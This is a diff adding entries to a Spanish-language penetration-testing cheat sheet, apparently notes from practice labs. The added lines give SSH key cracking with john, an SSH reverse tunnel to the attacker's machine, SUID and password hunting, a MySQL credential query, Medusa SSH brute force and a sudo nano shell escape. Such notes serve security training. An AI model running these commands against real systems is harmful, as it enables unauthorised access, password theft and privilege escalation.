@@ -43,6 +43,12 @@ xsltproc -o poison2.html nmap-bootstrap.xsl poison2.xml
  
  >hashcat.exe -m 0  3cc31cd246149aec68079241e71e98f6  rockyou.txt
 
+Tipos de hashesh
+https://www.whitehatsec.com/blog/magic-hashes/
+
+crackear un id_rsa
+ssh3john id_rsa > hash
+john hash --wordlist=/usr/share/wordlist/rockyou.txt
 
 ************************************************************* comandos para después de obtener una shell**
 Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.
@@ -171,6 +177,10 @@ Al final en el navegador se consultará como http://localhost:9000
 redirect desde windows a kali el tráfico
 conectarse a kali, desde puty con ssh -D8091 kali@192.168.0.5
 Después desde burpsuite en windows, en user options, poner el socket: 127.0.0.1 8091, nota: no responde PING, todas las consultas son resueltas a traves de burpsuite.
+
+Conexión reversa por un servicio que solo está a nivel localhost en el target
+ssh -R 1337:127.0.0.1:52846 kali@10.10.14.6
+
 ****************************************************Oracle***************************************************
 https://github.com/quentinhardy/odat
 Con el programa odat se puede realizar una enumeración del objetivo
@@ -399,6 +409,9 @@ scp user@10.10.10.48:/home/pi/usb.dd .
 sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd
 ****************************************************Buscar archivos en el sistema con permisos owner SUID************************************
 find / -perm -4000 2>/dev/null | xargs ls -la
+find / -user jimmy 2>/dev/null | xargs ls -la
+find / -user jimmy -ls 2>/dev/null 
+find / newermt "2019-11-28"  ! -newermt "2019-12-10" -ls 2>/dev/null
 **************************************************Crear hash de php****************************************************************************
 |-------(root@kali)-------|(~)
 |
@@ -408,3 +421,21 @@ Interactive mode enabled
 php > echo password_hash('cmd', PASSWORD_DEFAULT);
 $2y$10$2Q9eIXcbrxiFG0G9pLPzJu503fG67yj77kP6msbi0b6OWf2uzM2M2
 php >
+
+*************************************************enumeracion mysql**************************************************
+
+describe users;
+select id, username password from users;
+**************************************************Comando grep******************************************************
+buscar en todo, lo que tenga passwd y a su vez sql
+grep -R -i passwd . | grep -i sql
+
+*************************************************Fuerza bruta********************************************************
+Fuerza bruta a ssh
+medusa -h 10.10.10.171 -U users.txt -P passwords.txt  -M ssh 10.10.10.171
+*************************************************nano con privs**************************************************
+nano con privilegios
+sudo /bin/nano /opt/ona
+control + r y luego control + x
+Luego se escribe lo siguiente:
+reset; sh 1>&0 2>&0
